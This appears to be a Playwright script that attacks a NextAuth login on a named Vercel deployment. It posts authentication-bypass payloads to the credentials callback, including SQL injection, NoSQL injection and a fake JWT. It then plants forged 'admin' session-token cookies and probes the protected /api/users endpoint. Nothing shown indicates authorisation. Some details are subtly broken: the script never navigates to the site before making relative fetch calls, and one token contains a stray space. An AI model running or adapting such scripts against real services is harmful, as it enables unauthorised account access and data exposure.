const { chromium } = require('playwright');

(async () => {
    const browser = await chromium.launch({ headless: true });
    const page = await browser.newPage();
    
    // Get CSRF
    const csrfRes = await page.evaluate(async () => {
        const r = await fetch('/api/auth/csrf');
        return await r.json();
    });
    console.log("CSRF:", csrfRes.csrfToken);
    
    // Try to create session with empty/mock credentials
    const attempts = [
        // Attempt 1: Empty password
        { password: "", desc: "Empty password" },
        // Attempt 2: Null-like values
        { password: "null", desc: "Null string" },
        // Attempt 3: Undefined
        { password: "undefined", desc: "Undefined string" },
        // Attempt 4: SQL injection attempt
        { password: "' OR '1'='1", desc: "SQL injection" },
        // Attempt 5: NoSQL injection
        { password: '{"$gt":""}', desc: "NoSQL injection" },
        // Attempt 6: JWT manipulation
        { password: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", desc: "Fake JWT" }
    ];
    
    for (const attempt of attempts) {
        const result = await page.evaluate(async (data) => {
            const res = await fetch('/api/auth/callback/credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `password=${encodeURIComponent(data.password)}&redirect=false&csrfToken=${data.csrfToken}&callbackUrl=${encodeURIComponent(window.location.origin)}&json=true`
            });
            const text = await res.text();
            return { status: res.status, body: text.substring(0, 500) };
        }, { password: attempt.password, csrfToken: csrfRes.csrfToken });
        
        console.log(`\n[${attempt.desc}] Status: ${result.status}`);
        console.log(`Response: ${result.body}`);
    }
    
    // Test if we can access session endpoint
    const session = await page.evaluate(async () => {
        const r = await fetch('/api/auth/session');
        return await r.json();
    });
    console.log("\nSession state:", JSON.stringify(session));
    
    // Try to manipulate session via cookie injection
    console.log("\n=== TEST 3: Cookie Manipulation ===");
    await page.context().addCookies([
        { name: 'next-auth.session-token', value: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.XbPfb ThiMsvG627SDob_JhnPa1_73Q7bMz5nPBNYFPI', domain: 'sturdy-octo-memory-three.vercel.app', path: '/' },
        { name: '__Host-next-auth.session-token', value: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.XbPfbThiMsvG627SDob_JhnPa1_73Q7bMz5nPBNYFPI', domain: 'sturdy-octo-memory-three.vercel.app', path: '/' }
    ]);
    
    // Check if session is now valid
    const manipulatedSession = await page.evaluate(async () => {
        const r = await fetch('/api/auth/session');
        return await r.json();
    });
    console.log("Manipulated session:", JSON.stringify(manipulatedSession));
    
    // Try to access protected route
    const dashResponse = await page.evaluate(async () => {
        const r = await fetch('/api/users');
        return { status: r.status, body: await r.text() };
    });
    console.log("Dashboard access:", dashResponse.status, dashResponse.body.substring(0, 200));
    
    await browser.close();
})();
